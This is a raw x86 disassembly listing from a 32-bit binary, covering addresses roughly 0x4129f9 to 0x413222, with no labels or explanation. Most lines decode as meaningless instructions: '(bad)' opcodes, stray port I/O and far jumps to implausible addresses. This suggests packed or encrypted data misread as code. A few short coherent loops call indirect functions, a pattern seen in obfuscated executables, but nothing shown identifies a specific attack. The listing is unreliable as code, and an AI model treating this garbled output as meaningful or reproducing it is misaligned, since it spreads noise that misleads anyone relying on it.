  4129f9:	dec    ebx
  4129fb:	pop    ds
  4129fc:	lds    ebx,FWORD PTR [eax+eiz*8-0x6f2f1a3d]
  412a03:	adc    DWORD PTR [esi-0x16],ebx
  412a06:	pushf  
  412a07:	fwait
  412a08:	enter  0x1251,0xed
  412a0c:	out    dx,al
  412a0d:	add    edi,ebp
  412a0f:	or     BYTE PTR [esi+0x23],bl
  412a12:	sbb    bh,BYTE PTR [eax-0x74]
  412a15:	and    cl,bh
  412a17:	enter  0x844f,0x4e
  412a1b:	pop    ebp
  412a1c:	mov    ebp,0xf8f43133
  412a21:	sub    al,0xf7
  412a23:	push   eax
  412a24:	xchg   edi,eax
  412a25:	loopne 0x412aa2
  412a27:	cmp    DWORD PTR [ebp-0x1a],ebp
  412a2a:	fnstsw WORD PTR [ebx]
  412a2c:	imul   ecx,DWORD PTR [edi+0x18],0x606c470e
  412a33:	fwait
  412a34:	sub    eax,0xfc3116bb
  412a39:	loopne 0x412a5e
  412a3b:	inc    eax
  412a3c:	cmp    DWORD PTR [edi-0x23d492e4],0x5b9aff1f
  412a46:	in     eax,dx
  412a47:	mov    al,0x8
  412a49:	xchg   ebx,eax
  412a4a:	(bad)  
  412a4b:	arpl   WORD PTR [edx],si
  412a4d:	outs   dx,BYTE PTR ds:[esi]
  412a4e:	test   eax,0x42a0f545
  412a53:	jnp    0x412ad4
  412a55:	pop    eax
  412a56:	mov    dh,0x5a
  412a58:	inc    edx
  412a59:	add    al,0x61
  412a5b:	sbb    DWORD PTR [edi+0x40],0xfed4c426
  412a62:	pop    ebp
  412a63:	xchg   edi,eax
  412a64:	lods   al,BYTE PTR ds:[esi]
  412a65:	enter  0x788,0x82
  412a69:	fs mov ebp,edx
  412a6c:	shl    BYTE PTR [ecx+0x17],0x94
  412a70:	popa   
  412a71:	enter  0x4f30,0x9c
  412a75:	(bad)  
  412a76:	repz add edx,eax
  412a79:	mov    esi,0xb749321e
  412a7e:	adc    BYTE PTR [eax+0x4a],dh
  412a81:	aaa    
  412a82:	(bad)  
  412a84:	loope  0x412a08
  412a86:	scas   eax,DWORD PTR es:[edi]
  412a87:	hlt    
  412a88:	stos   BYTE PTR es:[edi],al
  412a89:	adc    ecx,0x61
  412a8c:	scas   eax,DWORD PTR es:[edi]
  412a8d:	push   ebx
  412a8e:	jne    0x412a9a
  412a90:	je     0x412aa6
  412a96:	mov    ecx,DWORD PTR [ebp+0x14]
  412a99:	add    edi,DWORD PTR ds:0x42e120
  412a9f:	mov    ecx,DWORD PTR [ecx]
  412aa1:	or     esi,esi
  412aa3:	mov    DWORD PTR [ebp-0x1c],ecx
  412aa6:	mov    DWORD PTR ds:0x42fcf5,0x17
  412ab0:	cmp    DWORD PTR ds:0x42fcf5,0x0
  412ab7:	je     0x412b09
  412abd:	cmp    DWORD PTR ds:0x42fcf5,0x24
  412ac4:	jne    0x412af1
  412aca:	push   0x5fda
  412acf:	push   0x42de
  412ad4:	push   0x6b28
  412ad9:	push   0x4e0a
  412ade:	push   DWORD PTR [ebp-0x10]
  412ae1:	push   0x8dcd
  412ae6:	push   0x86d4
  412aeb:	call   DWORD PTR ds:0x42e317
  412af1:	mov    edi,DWORD PTR ds:0x42fcf5
  412af7:	dec    edi
  412af8:	mov    DWORD PTR ds:0x42fcf5,edi
  412afe:	jmp    0x412ab0
  412b03:	and    ecx,DWORD PTR ds:0x42e128
  412b09:	imul   edx,eax
  412b0c:	mov    ecx,0x4573
  412b11:	add    DWORD PTR ds:0x42e118,edx
  412b17:	add    edx,ecx
  412b19:	mov    esi,0x7879
  412b1e:	sub    edi,0x22a0
  412b24:	mov    edi,0x1556
  412b29:	jmp    0x412e0d
  412b2e:	retf   
  412b2f:	sbb    eax,eax
  412b31:	inc    esp
  412b32:	loopne 0x412ba7
  412b34:	push   ebx
  412b35:	mov    bl,0x1a
  412b37:	ror    BYTE PTR [edi],cl
  412b39:	ja     0x412ae3
  412b3b:	inc    ebp
  412b3c:	dec    ebp
  412b3d:	xchg   esi,eax
  412b3e:	adc    DWORD PTR [esi+0x70],esp
  412b41:	jo     0x412afc
  412b43:	jle    0x412bb5
  412b45:	jo     0x412b22
  412b47:	rol    bl,1
  412b49:	mov    ebp,0xb8b887a5
  412b4e:	mov    ch,0xe8
  412b50:	jg     0x412b87
  412b52:	push   edx
  412b53:	mov    dl,cl
  412b55:	or     DWORD PTR [esi-0x7d5d188f],edi
  412b5b:	push   0x361a21fd
  412b60:	and    edx,DWORD PTR [ecx]
  412b62:	push   ebp
  412b63:	add    al,0x51
  412b65:	jne    0x412b57
  412b67:	cdq    
  412b68:	pop    esi
  412b69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b6a:	in     eax,dx
  412b6b:	dec    esp
  412b6c:	xchg   BYTE PTR ds:0x6af81978,bl
  412b72:	(bad)  
  412b73:	(bad)  
  412b75:	mov    al,ds:0x6b225c6e
  412b7a:	mov    ch,0x80
  412b7c:	stos   BYTE PTR es:[edi],al
  412b7d:	mov    ch,0x51
  412b7f:	xchg   edx,eax
  412b80:	jns    0x412bac
  412b82:	daa    
  412b83:	mov    ebx,0x24c956ae
  412b88:	in     al,dx
  412b89:	fidivr DWORD PTR [edi+eax*4]
  412b8c:	xchg   edi,eax
  412b8d:	sbb    cl,bl
  412b8f:	jge    0x412b76
  412b91:	(bad)  
  412b92:	jmp    0xe22a:0xfff169ea
  412b99:	pop    eax
  412b9a:	in     al,dx
  412b9b:	out    dx,eax
  412b9c:	out    dx,al
  412b9d:	inc    esp
  412b9e:	adc    BYTE PTR [eax],ah
  412ba0:	pop    edi
  412ba1:	retf   
  412ba2:	jbe    0x412b71
  412ba4:	ds sbb esi,ebx
  412ba7:	or     eax,0xfac7365e
  412bac:	ins    BYTE PTR es:[edi],dx
  412bad:	das    
  412bae:	adc    cl,BYTE PTR [eax+0x4e3bfc4e]
  412bb4:	push   ebp
  412bb5:	add    BYTE PTR [esi+0x5f],cl
  412bb8:	pop    edi
  412bb9:	sbb    eax,0xd4240b82
  412bbe:	retf   0xb45a
  412bc1:	into   
  412bc2:	ins    BYTE PTR es:[edi],dx
  412bc3:	and    DWORD PTR [esi-0xdacfe75],edi
  412bc9:	in     eax,dx
  412bca:	ds xchg ebp,eax
  412bcc:	xor    al,0x37
  412bce:	das    
  412bcf:	adc    ah,BYTE PTR [ebp-0x1ad7a136]
  412bd5:	(bad)  
  412bd6:	xchg   BYTE PTR gs:[edi-0x7b],ch
  412bda:	loop   0x412bd9
  412bdc:	loope  0x412c10
  412bde:	sti    
  412bdf:	mov    ds:0xb05886b5,al
  412be4:	mov    ss,WORD PTR [ecx-0x42]
  412be7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412be8:	mov    dl,0x55
  412bea:	sbb    al,0xd5
  412bec:	pop    es
  412bed:	adc    DWORD PTR [ecx-0x21f9c7ca],esp
  412bf3:	cmp    esi,edx
  412bf5:	call   0xcc99c8cc
  412bfa:	out    0xb2,al
  412bfc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412bfd:	scas   eax,DWORD PTR es:[edi]
  412bfe:	fldenv [ebx-0x52]
  412c01:	(bad)  
  412c02:	daa    
  412c03:	jo     0x412c5f
  412c05:	test   eax,0x7a9b3c50
  412c0a:	cld    
  412c0b:	sbb    al,0x6
  412c0d:	pop    edx
  412c0e:	fld    TBYTE PTR [ecx-0x2e]
  412c11:	mov    bl,BYTE PTR [edx-0x7e884262]
  412c17:	mov    ds:0x7aee9370,al
  412c1c:	lea    eax,[ebp+0x78ccdc92]
  412c22:	push   ebp
  412c23:	imul   esp,DWORD PTR [edx],0x7
  412c26:	mov    eax,ds:0x35e2b80a
  412c2b:	outs   dx,BYTE PTR ds:[esi]
  412c2c:	xor    eax,0x6f110ded
  412c31:	mov    edx,DWORD PTR [eax+0x57]
  412c34:	outs   dx,DWORD PTR ds:[esi]
  412c35:	mov    bh,0x65
  412c37:	inc    esi
  412c38:	sbb    esi,ecx
  412c3a:	adc    ah,BYTE PTR [ebp-0x28588b49]
  412c40:	jnp    0x412c08
  412c42:	push   ds
  412c43:	inc    edx
  412c44:	sub    edx,eax
  412c46:	dec    ebp
  412c47:	repnz xor BYTE PTR [ebx],al
  412c4a:	movd   mm3,DWORD PTR [esi+0x382cefba]
  412c51:	fild   WORD PTR [edx]
  412c53:	mov    BYTE PTR [ecx+0x6722dcab],ah
  412c59:	jne    0x412ca3
  412c5b:	push   edx
  412c5c:	or     esi,0xd07ac8ea
  412c62:	fwait
  412c63:	outs   dx,DWORD PTR ds:[esi]
  412c64:	push   0xfffffff8
  412c66:	(bad)  
  412c67:	pop    edx
  412c68:	shl    esp,0xfd
  412c6b:	mov    DWORD PTR [eax+ecx*8],esi
  412c6e:	sub    esi,DWORD PTR [ecx-0x2a771224]
  412c74:	push   cs
  412c75:	mov    bl,0xeb
  412c77:	xchg   edi,eax
  412c78:	jo     0x412c30
  412c7a:	pop    esi
  412c7b:	push   0x3f465a9d
  412c80:	jg     0x412ced
  412c82:	mov    WORD PTR [ebx],ss
  412c84:	jnp    0x412ca2
  412c86:	xchg   edx,eax
  412c87:	test   BYTE PTR [edx+0x3e],bh
  412c8a:	repz ret 
  412c8c:	retf   
  412c8d:	rcr    BYTE PTR [edi-0x1c],1
  412c90:	inc    edx
  412c91:	mov    eax,ds:0x7a4d0584
  412c96:	fchs   
  412c98:	ins    DWORD PTR es:[edi],dx
  412c99:	cmp    al,0x66
  412c9b:	ja     0x412c31
  412c9d:	repnz add al,0x6
  412ca0:	out    dx,al
  412ca1:	or     al,0x37
  412ca3:	mov    al,ds:0x813de89b
  412ca8:	imul   cl
  412caa:	ret    0x1233
  412cad:	mov    ebx,ebx
  412caf:	mov    esp,0x8a9c1a39
  412cb4:	leave  
  412cb5:	cmp    eax,0x33535f25
  412cba:	add    edx,edx
  412cbc:	aam    0x43
  412cbe:	jbe    0x412c95
  412cc0:	jl     0x412cab
  412cc2:	or     BYTE PTR [edx],0xae
  412cc5:	mov    esi,0xde466884
  412cca:	mov    ecx,0xae6d0e61
  412ccf:	add    esi,DWORD PTR [ecx+0x79224ca3]
  412cd5:	rol    BYTE PTR [ebp+0x22b8f8f7],0x93
  412cdc:	inc    esi
  412cdd:	and    dl,BYTE PTR [edi+edx*1]
  412ce0:	dec    ecx
  412ce1:	jle    0x412ccc
  412ce3:	ficomp WORD PTR [esi+0x4221097c]
  412ce9:	(bad)  
  412cea:	adc    BYTE PTR [ebx],ch
  412cec:	cmp    DWORD PTR [edx],edi
  412cee:	and    eax,0xbcfe6931
  412cf3:	pop    ebx
  412cf4:	or     DWORD PTR [esi],0x2a
  412cf7:	adc    cl,dl
  412cf9:	or     ch,BYTE PTR [ebp+0x710ec6f2]
  412cff:	aam    0x39
  412d01:	or     eax,0x6e3e80cd
  412d06:	add    bl,bl
  412d08:	fdivr  QWORD PTR [eax+0x558be8ab]
  412d0e:	push   ecx
  412d0f:	push   ds
  412d10:	mov    ds:0xa28209a0,al
  412d15:	(bad)  
  412d17:	push   ecx
  412d18:	jmp    0xc9ea:0xdaaa0e63
  412d1f:	jecxz  0x412da0
  412d21:	aam    0xc2
  412d23:	je     0x412d73
  412d25:	cmp    eax,0x7d1da810
  412d2a:	ror    DWORD PTR [ebx],cl
  412d2c:	sub    al,0xeb
  412d2e:	push   edx
  412d2f:	adc    al,0xac
  412d31:	or     BYTE PTR [edx-0x6175988f],ah
  412d37:	push   ebp
  412d38:	xchg   edi,eax
  412d39:	ret    
  412d3a:	add    al,0xc3
  412d3c:	(bad)  
  412d3d:	and    eax,0xe6e14d44
  412d42:	cld    
  412d43:	xor    al,0x5e
  412d45:	dec    ecx
  412d46:	or     BYTE PTR [esi],ch
  412d48:	sbb    esp,ebp
  412d4a:	xor    ecx,edi
  412d4c:	sub    edx,edx
  412d4e:	mov    edi,0x661eb7d3
  412d53:	pop    ds
  412d54:	shl    DWORD PTR [edx+0x1e],cl
  412d57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d58:	int3   
  412d59:	inc    ecx
  412d5a:	xor    ebx,edx
  412d5c:	(bad)  
  412d5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d5e:	add    eax,0x920eeeac
  412d63:	icebp  
  412d64:	inc    edx
  412d65:	test   di,0x302c
  412d6a:	jg     0x412d9a
  412d6c:	pop    ss
  412d6d:	dec    ecx
  412d6e:	add    bh,dl
  412d70:	sti    
  412d71:	(bad)  
  412d72:	div    DWORD PTR [eax-0x7b39c3f1]
  412d78:	das    
  412d79:	pop    ebx
  412d7a:	jl     0x83909f0d
  412d80:	in     eax,dx
  412d81:	xor    dh,ah
  412d83:	aas    
  412d84:	lock sbb eax,0x14775a3c
  412d8a:	in     al,0x2a
  412d8c:	xor    al,0x5c
  412d8e:	fild   QWORD PTR [esi]
  412d90:	mov    BYTE PTR [edi],ah
  412d92:	mov    esp,0x8c3e6518
  412d97:	into   
  412d98:	int3   
  412d99:	clc    
  412d9a:	mov    ebx,0x6c771bfe
  412d9f:	sahf   
  412da0:	leave  
  412da1:	or     esi,DWORD PTR [edx]
  412da3:	stos   BYTE PTR es:[edi],al
  412da4:	xchg   esp,eax
  412da5:	cmp    cl,BYTE PTR [ebp-0x71988364]
  412dab:	jle    0x412d8b
  412dad:	mov    al,dh
  412daf:	scas   al,BYTE PTR es:[edi]
  412db0:	inc    esi
  412db1:	push   0xf81b0175
  412db6:	sahf   
  412db7:	dec    ecx
  412db8:	dec    esi
  412db9:	sub    BYTE PTR [ebx],bh
  412dbb:	push   edx
  412dbc:	push   edx
  412dbd:	pop    ebx
  412dbe:	and    dh,BYTE PTR [ecx+0x31]
  412dc1:	inc    edx
  412dc2:	and    eax,0x619ce8f3
  412dc7:	addr16 inc eax
  412dc9:	je     0x412dbd
  412dcb:	rcr    BYTE PTR [edi],1
  412dcd:	iret   
  412dce:	push   0x4b
  412dd0:	daa    
  412dd1:	mov    al,0x6d
  412dd3:	add    cl,BYTE PTR [esi-0xc86a000]
  412dd9:	cld    
  412dda:	push   ebx
  412ddb:	sbb    ecx,ebx
  412ddd:	xor    BYTE PTR cs:[eax-0x5b],ah
  412de1:	inc    esp
  412de2:	jne    0x412e4b
  412de4:	icebp  
  412de5:	ins    DWORD PTR es:[edi],dx
  412de6:	test   DWORD PTR [esi+ebx*1-0x255a7462],edi
  412ded:	mov    edi,0x81520877
  412df2:	pop    ss
  412df3:	sub    al,BYTE PTR [esi+0x5d]
  412df6:	dec    edx
  412df7:	adc    cl,BYTE PTR ds:0xdf224caa
  412dfd:	mov    ebx,0x20957eb1
  412e02:	xchg   DWORD PTR [eax+0x7889e48],eax
  412e08:	out    dx,al
  412e09:	(bad)  
  412e0a:	test   eax,0xce87b503
  412e0f:	and    DWORD PTR ds:0x42e11c,0x0
  412e19:	jmp    0x412e2d
  412e1e:	xor    ecx,ecx
  412e20:	add    ecx,DWORD PTR ds:0x42e11c
  412e26:	inc    ecx
  412e27:	mov    DWORD PTR ds:0x42e11c,ecx
  412e2d:	cmp    DWORD PTR ds:0x42e11c,0x17
  412e34:	jae    0x412e60
  412e3a:	cmp    DWORD PTR ds:0x42e11c,0x25
  412e41:	jne    0x412e55
  412e47:	push   0x286f
  412e4c:	push   DWORD PTR [ebp-0x18]
  412e4f:	call   DWORD PTR ds:0x42e487
  412e55:	jmp    0x412e1e
  412e5a:	xor    ecx,0x7ba7
  412e60:	sub    edx,edi
  412e62:	xor    esi,esi
  412e64:	jmp    0x413148
  412e69:	call   0x6aab08c6
  412e6e:	jno    0x412ee7
  412e70:	popa   
  412e71:	push   ebx
  412e72:	xchg   eax,esp
  412e74:	arpl   WORD PTR [esi],bx
  412e76:	cmc    
  412e77:	mov    al,0xa4
  412e79:	pop    edx
  412e7a:	fs jo  0x412eed
  412e7d:	mov    ecx,0x2c70707e
  412e82:	mov    eax,ds:0xfaff32a1
  412e87:	push   edi
  412e88:	pop    ebp
  412e89:	add    eax,0xad15cc5b
  412e8e:	inc    esp
  412e8f:	out    0x17,al
  412e91:	or     eax,0x1c05fd3f
  412e96:	pop    ss
  412e97:	push   ebp
  412e98:	xchg   ebx,eax
  412e99:	or     BYTE PTR [edi+0x33d22889],bl
  412e9f:	mov    al,ds:0xa3ced1d4
  412ea4:	arpl   WORD PTR [edi+0x37a94418],di
  412eaa:	push   edx
  412eab:	aam    0x5d
  412ead:	pop    edx
  412eae:	sbb    ebx,DWORD PTR [ebx]
  412eb0:	sbb    DWORD PTR [edi-0x34],0x7a4b5bed
  412eb7:	inc    ebx
  412eb8:	cmc    
  412eb9:	pop    es
  412eba:	push   edi
  412ebb:	sbb    edi,ecx
  412ebd:	std    
  412ebe:	mov    edx,0x1da89a5b
  412ec3:	out    0xcf,eax
  412ec5:	cmc    
  412ec6:	sub    eax,0x9860fe66
  412ecb:	dec    edi
  412ecc:	mov    ds:0x9d968447,al
  412ed1:	jno    0x412ee3
  412ed3:	in     eax,0x9f
  412ed5:	add    BYTE PTR [edx+0x2a1ae61a],ah
  412edb:	mov    ds:0xba869a25,eax
  412ee0:	pop    eax
  412ee1:	loope  0x412f1b
  412ee3:	pop    eax
  412ee4:	jb     0x412ee1
  412ee6:	mov    ah,0xce
  412ee8:	sar    ch,cl
  412eea:	cli    
  412eeb:	jl     0x412eaa
  412eed:	ins    DWORD PTR es:[edi],dx
  412eee:	inc    esp
  412eef:	xchg   esi,eax
  412ef0:	mov    edx,0x9141e23a
  412ef5:	retf   
  412ef6:	pop    ss
  412ef7:	push   0xa756dabb
  412efc:	mul    BYTE PTR [edx-0x57]
  412eff:	ss push 0xffffffec
  412f02:	mov    ds:0xd9842ffa,al
  412f07:	adc    al,0xc7
  412f09:	push   DWORD PTR [ebx-0x17]
  412f0c:	inc    ebx
  412f0d:	(bad)  [edi+0x2e05e5a4]
  412f13:	mov    bh,bl
  412f15:	enter  0xa89d,0x8e
  412f19:	(bad)  
  412f1a:	cld    
  412f1b:	xchg   edi,eax
  412f1c:	les    ebx,FWORD PTR ds:0xdf74608a
  412f22:	push   0xffffffeb
  412f24:	int3   
  412f25:	push   es
  412f26:	dec    esp
  412f27:	add    dl,BYTE PTR [ebx-0x79]
  412f2a:	ret    0xd7ff
  412f2d:	mov    al,ds:0xc172e4e0
  412f32:	loop   0x412f28
  412f34:	aaa    
  412f35:	ds sub eax,0x231d03fa
  412f3b:	(bad)  
  412f3c:	pop    eax
  412f3d:	and    dh,bl
  412f3f:	shl    ecx,1
  412f41:	ja     0x412f7f
  412f43:	jb     0x412fbb
  412f45:	ret    0x96e6
  412f48:	lahf   
  412f49:	cli    
  412f4a:	arpl   WORD PTR [ebx+0x6121d68f],bp
  412f50:	cld    
  412f51:	pop    ds
  412f52:	push   cs
  412f53:	dec    ecx
  412f54:	leave  
  412f55:	inc    esp
  412f56:	xchg   edx,edi
  412f58:	scas   al,BYTE PTR es:[edi]
  412f59:	sbb    dl,BYTE PTR [esi+esi*4-0x6e]
  412f5d:	pop    ds
  412f5e:	mov    edi,0x49bb9faa
  412f63:	jnp    0x412fb0
  412f65:	jmp    0x412fa1
  412f67:	ja     0x412f58
  412f69:	and    ch,cl
  412f6b:	jg     0x412f4d
  412f6d:	fadd   QWORD PTR [ecx+edi*4+0x43]
  412f71:	xor    DWORD PTR [edi-0x45],ebx
  412f74:	dec    edx
  412f75:	and    bh,BYTE PTR [eax]
  412f77:	retf   0x8de1
  412f7a:	or     eax,esi
  412f7c:	add    eax,0x97ecb1dc
  412f81:	mov    ah,0xc9
  412f83:	cs addr16 sti 
  412f86:	loopne 0x412f68
  412f88:	add    BYTE PTR [ebp-0x27],ch
  412f8b:	or     eax,0x9119a57b
  412f90:	popa   
  412f91:	test   DWORD PTR [ebp-0x435977f],edi
  412f97:	and    ebx,DWORD PTR [ebp+0x20]
  412f9a:	adc    DWORD PTR [eax],0xda77111e
  412fa0:	push   eax
  412fa1:	cwde   
  412fa2:	retf   0x2015
  412fa5:	push   edi
  412fa6:	mov    esi,0xc7d029d5
  412fab:	and    al,0xc
  412fad:	mov    es,WORD PTR [eax+0x3e]
  412fb0:	outs   dx,DWORD PTR ds:[esi]
  412fb1:	add    al,0xe5
  412fb3:	push   ebx
  412fb4:	xlat   BYTE PTR ds:[ebx]
  412fb5:	add    DWORD PTR [edi+esi*1],edx
  412fb8:	sub    bl,dl
  412fba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412fbb:	das    
  412fbc:	data16 cld 
  412fbe:	sub    ah,0xe8
  412fc1:	push   esi
  412fc2:	leave  
  412fc3:	fadd   st(2),st
  412fc5:	push   ebx
  412fc6:	inc    edx
  412fc7:	imul   ebp,DWORD PTR [ebp+0x69],0x7
  412fcb:	push   0x10ae536a
  412fd0:	mov    eax,ds:0x4f4203de
  412fd5:	push   cs
  412fd6:	scas   eax,DWORD PTR es:[edi]
  412fd7:	pop    esi
  412fd8:	inc    ecx
  412fd9:	popf   
  412fda:	jae    0x41303e
  412fdc:	push   edi
  412fdd:	jmp    0x412ff1
  412fdf:	jmp    0xcdef:0xe130b25c
  412fe6:	outs   dx,BYTE PTR ds:[esi]
  412fe7:	sub    BYTE PTR [ebp-0x45],0xf7
  412feb:	pop    ebx
  412fec:	aam    0xb
  412fee:	mov    ecx,0x2dbdfa82
  412ff3:	outs   dx,DWORD PTR ds:[esi]
  412ff4:	jmp    0xcb57:0x2a494a9d
  412ffb:	(bad)  
  412ffc:	sahf   
  412ffd:	outs   dx,BYTE PTR ds:[esi]
  412ffe:	xor    eax,0xc6b69c0d
  413003:	enter  0x7b6d,0x26
  413007:	jo     0x413085
  413009:	pop    ss
  41300a:	jb     0x413017
  41300c:	loope  0x41308c
  41300e:	adc    DWORD PTR [esi-0x7e9ee53b],edx
  413014:	call   0xd8c69fc
  413019:	aad    0x77
  41301b:	pop    esp
  41301c:	(bad)  
  41301d:	cdq    
  41301e:	mov    edi,0x83c29bf6
  413023:	adc    BYTE PTR [esi],cl
  413025:	adc    al,0xa5
  413027:	mul    BYTE PTR [eax+0x60d48280]
  41302d:	ja     0x413061
  41302f:	xchg   ebx,eax
  413030:	loope  0x413083
  413032:	les    ebx,FWORD PTR [edi]
  413034:	sbb    BYTE PTR [ebx],bl
  413036:	mov    eax,DWORD PTR [ecx+0x24]
  413039:	mov    eax,0x32266c3b
  41303e:	int3   
  41303f:	loopne 0x412fda
  413041:	stos   BYTE PTR es:[edi],al
  413042:	jnp    0x413048
  413044:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413045:	push   ebp
  413046:	stos   BYTE PTR es:[edi],al
  413047:	aaa    
  413048:	mov    dh,0x2f
  41304a:	add    dh,BYTE PTR [edx-0x26]
  41304d:	mov    ch,0x55
  41304f:	jne    0x412fd2
  413051:	pop    ds
  413052:	pusha  
  413053:	cld    
  413054:	push   ss
  413055:	std    
  413056:	(bad)  
  413058:	pusha  
  413059:	mov    cs,ecx
  41305b:	sbb    al,0xaa
  41305d:	fs out dx,al
  41305f:	sub    ah,0xa4
  413062:	inc    esi
  413063:	call   0x4f9c7fd6
  413068:	cwde   
  413069:	mov    dh,0x33
  41306b:	test   DWORD PTR [esi],esp
  41306d:	push   edi
  41306e:	fldcw  WORD PTR [ecx+0x4a]
  413071:	sahf   
  413072:	xchg   esp,eax
  413073:	inc    esi
  413074:	cmp    edi,ebp
  413076:	adc    BYTE PTR [esi],ch
  413078:	and    al,0x90
  41307a:	sub    eax,0xa41230cc
  41307f:	xchg   BYTE PTR ds:0x11a11abb,dl
  413085:	xchg   DWORD PTR ds:0x564339b,ebp
  41308b:	rol    edi,0xf
  41308e:	int    0x3e
  413090:	int3   
  413091:	dec    eax
  413092:	xchg   ecx,eax
  413093:	or     al,0x77
  413095:	cmp    BYTE PTR [ecx+0x46],ch
  413098:	shr    DWORD PTR [edx-0x22],1
  41309b:	dec    ebx
  41309c:	pushf  
  41309d:	sahf   
  41309e:	pop    ds
  41309f:	inc    ebx
  4130a0:	fwait
  4130a1:	cld    
  4130a2:	mov    edx,DWORD PTR [edx+0x6d]
  4130a5:	gs mov ebx,0xe8c671be
  4130ab:	rcr    DWORD PTR [ecx-0x62],cl
  4130ae:	jae    0x413036
  4130b0:	ins    DWORD PTR es:[edi],dx
  4130b1:	je     0x4130e5
  4130b3:	jno    0x41305b
  4130b5:	jmp    0x4130ad
  4130b7:	jno    0x413130
  4130b9:	enter  0xfd64,0x27
  4130bd:	fucomp st(4)
  4130bf:	scas   eax,DWORD PTR es:[edi]
  4130c0:	ins    BYTE PTR es:[edi],dx
  4130c1:	js     0x4130a1
  4130c3:	jno    0x41313a
  4130c5:	push   cs
  4130c6:	lds    edi,FWORD PTR [eax+0x35c3482b]
  4130cc:	mov    ch,0xd2
  4130ce:	mov    eax,0xf9cd233
  4130d3:	push   0x6f
  4130d5:	aam    0x4
  4130d7:	jl     0x413153
  4130d9:	cwde   
  4130da:	aaa    
  4130db:	or     eax,DWORD PTR [ecx-0x38b75892]
  4130e1:	call   0x2b41c402
  4130e6:	xchg   ebx,eax
  4130e7:	fiadd  WORD PTR [edi-0x1bab657f]
  4130ed:	pop    ebp
  4130ee:	in     eax,0x7c
  4130f0:	and    cl,BYTE PTR [ebp-0x29]
  4130f3:	push   es
  4130f4:	jae    0x4130ce
  4130f6:	cs push edi
  4130f8:	sbb    al,0x61
  4130fa:	test   al,0x9d
  4130fc:	retf   
  4130fd:	bound  eax,QWORD PTR [esi+0x18ce0322]
  413103:	xlat   BYTE PTR ds:[ebx]
  413104:	pop    ecx
  413105:	in     al,dx
  413106:	cmp    ah,BYTE PTR [edx+eax*1]
  413109:	(bad)  
  41310a:	fmul   QWORD PTR [edi+0x6d]
  41310d:	cmp    bh,BYTE PTR [edi+eax*2]
  413110:	or     eax,0xab0b31d8
  413115:	xchg   BYTE PTR [ecx+0x62],bl
  413118:	ficom  WORD PTR [esi-0x30]
  41311b:	cmp    al,BYTE PTR [edx+0x37]
  41311e:	jmp    DWORD PTR [eax+0xb]
  413121:	adc    ah,BYTE PTR [ebx]
  413123:	int3   
  413124:	pop    ds
  413125:	sub    al,0xf3
  413127:	cli    
  413128:	sbb    al,BYTE PTR [eax-0x39]
  41312b:	stc    
  41312c:	call   0x700b:0xf4030609
  413133:	sub    bl,ah
  413135:	aad    0xe6
  413137:	jmp    0xc830:0xb176ea0b
  41313e:	mov    ch,BYTE PTR [eax+0x443f69f0]
  413144:	xor    dl,bh
  413146:	fimul  DWORD PTR [ecx+ecx*4]
  413149:	jne    0x413123
  41314b:	mov    DWORD PTR [ebp-0x2c],esi
  41314e:	mov    DWORD PTR [ebp-0x14],esi
  413151:	adc    ecx,0x52b8
  413157:	mov    DWORD PTR [ebp-0x8],esi
  41315a:	xor    ecx,DWORD PTR ds:0x42fcf9
  413160:	mov    ecx,DWORD PTR [ebp-0x18]
  413163:	xor    ecx,eax
  413165:	adc    DWORD PTR ds:0x42e128,ebx
  41316b:	xor    edi,edi
  41316d:	jmp    0x413451
  413172:	push   0x51581534
  413177:	popa   
  413178:	jne    0x4131ae
  41317a:	add    edx,ebp
  41317c:	cmp    al,BYTE PTR [ecx]
  41317e:	push   0xffffffd0
  413180:	retf   0xa3f4
  413183:	popa   
  413184:	jo     0x4131f6
  413186:	mov    ecx,0x8270707e
  41318b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41318c:	loopne 0x413174
  41318e:	xor    BYTE PTR [ebx+esi*4+0x3b304c52],bl
  413195:	ret    
  413196:	sar    ebx,cl
  413198:	mov    esi,0x14010751
  41319d:	mov    WORD PTR [esi],?
  41319f:	sbb    ebx,ebx
  4131a1:	mov    ecx,0x8f6ea342
  4131a6:	dec    ebx
  4131a7:	cdq    
  4131a8:	ja     0x413163
  4131aa:	push   ss
  4131ab:	mov    al,0x62
  4131ad:	ss loope 0x41316c
  4131b0:	(bad)  
  4131b1:	(bad)  
  4131b2:	xor    BYTE PTR [edi],dh
  4131b4:	in     al,0x78
  4131b6:	push   ss
  4131b7:	jmp    0x413151
  4131b9:	ins    BYTE PTR es:[edi],dx
  4131ba:	scas   al,BYTE PTR es:[edi]
  4131bb:	iret   
  4131bc:	out    0x69,al
  4131be:	int    0x63
  4131c0:	cmp    BYTE PTR [ecx-0x1b1a423f],al
  4131c6:	or     ebp,0x14
  4131c9:	scas   al,BYTE PTR es:[edi]
  4131ca:	rol    DWORD PTR [eax+ebp*1],1
  4131cd:	fadd   QWORD PTR [edi+0x4d]
  4131d0:	fs (bad) 
  4131d2:	cmp    dl,cl
  4131d4:	cmp    BYTE PTR [esi+0x692b47f6],bh
  4131da:	xchg   esp,eax
  4131db:	xlat   BYTE PTR ds:[ebx]
  4131dc:	scas   al,BYTE PTR es:[edi]
  4131dd:	(bad)  
  4131df:	sub    ecx,ecx
  4131e1:	fstp   DWORD PTR ss:[esi-0x74df8a10]
  4131e8:	mov    ds,WORD PTR es:[ebx]
  4131eb:	sub    bh,BYTE PTR [ebp+0x5f5cb000]
  4131f1:	out    0x18,eax
  4131f3:	out    dx,al
  4131f4:	cmp    DWORD PTR [edi+0x63],edx
  4131f7:	sub    esi,edx
  4131f9:	fwait
  4131fa:	xchg   edx,eax
  4131fb:	sub    bl,bl
  4131fd:	jmp    0x41324e
  4131ff:	loopne 0x413266
  413201:	xor    DWORD PTR [ebp+0x70],ecx
  413204:	ins    DWORD PTR es:[edi],dx
  413205:	add    eax,0x3e39e69c
  41320a:	inc    edi
  41320b:	add    DWORD PTR [edx],ebp
  41320d:	rcl    ah,1
  41320f:	push   cs
  413210:	and    DWORD PTR [edi+0x1a6c2db4],eax
  413216:	mov    edi,0xb1e7d5fc
  41321b:	sub    bl,bl
  41321d:	cmp    eax,0x5cadd085
  413222:	inc    ebp
